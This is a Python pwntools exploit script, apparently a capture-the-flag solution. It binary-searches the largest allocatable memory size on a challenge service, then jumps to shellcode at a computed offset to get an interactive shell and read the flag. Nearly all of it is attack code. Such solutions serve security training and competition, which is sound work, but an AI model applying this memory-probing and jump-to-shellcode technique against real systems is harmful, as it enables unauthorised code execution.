from pwn import *

LOCAL = True

if LOCAL:
    io = remote('127.0.0.1', 9001, timeout = 20)
else:
    io = remote('54.202.7.144', 6969)

# fill lower memory between code and libraries
for i in range(1):
    print 'Allocation ' + str(i)
    print io.recvuntil('[a]lloc, [j]ump : ')
    io.send('a\n')
    print io.recvuntil('sz? ')
    io.send(str(2**45)+'\n')
    print io.recvuntil('free? ')
    io.send('n\n')

# Set lower and upper bound on size to search for
min1 = 2**42
max1 = 2**47
binDif = (max1-min1)/2 + min1

io.recvuntil('[a]lloc, [j]ump : ')
prev = 0

# Perform binary search until max allocation size is found
for i in range(10000):
    # Debug print
    if (i%3 == 0):
        print 'Bindif is: ' + hex(binDif)

    # Create allocation of size binDif
    io.send('a\n')
    io.recvuntil('sz? ')
    io.send(str(binDif)+'\n')
    str1 = io.recv(4)

    # The allocation is smaller than the largest free space in the program
    if (str1 == 'FAIL'):
        #print 'Too big!'
        io.recvuntil('[a]lloc, [j]ump : ')
        max1 = binDif
        binDif = (max1-min1)/2 + min1
    # The allocation is smaller than the largest free space in the program
    else:
        #print 'Too small!'
        io.recvuntil(' ')
        io.send('y\n')
        min1 = binDif
        binDif = (max1-min1)/2 + min1
        io.recvuntil('[a]lloc, [j]ump : ')
    # We're within one page (0x1000) of the max size allowed
    if (prev >> 12 == binDif >> 12):
        # Page align max allocation size
        binDif = (binDif >> 12) << 12
        print 'Found max size: ' + hex(binDif)
        break
    # Not found yet
    else:
        prev = binDif

# Based on testing shellcode is consistently 16 or 17 pages farther than the size found
binDif += 0x10000

# Jump to shellcode
print 'Jumping to: ' + hex(binDif)
io.send('j\n')
print io.recvuntil('sz? ')
io.send(str(binDif)+'\n')

# cat that flag!
io.interactive()
io.close()

# Retry with a 17 page offset instead of 16
if (! LOCAL):
    binDif += 0x1000
    io = remote('54.202.7.144', 6969)
    # Jump to shellcode
    print 'Jumping to: ' + hex(binDif)
    io.send('j\n')
    print io.recvuntil('sz? ')
    io.send(str(binDif)+'\n')
    io.interactive()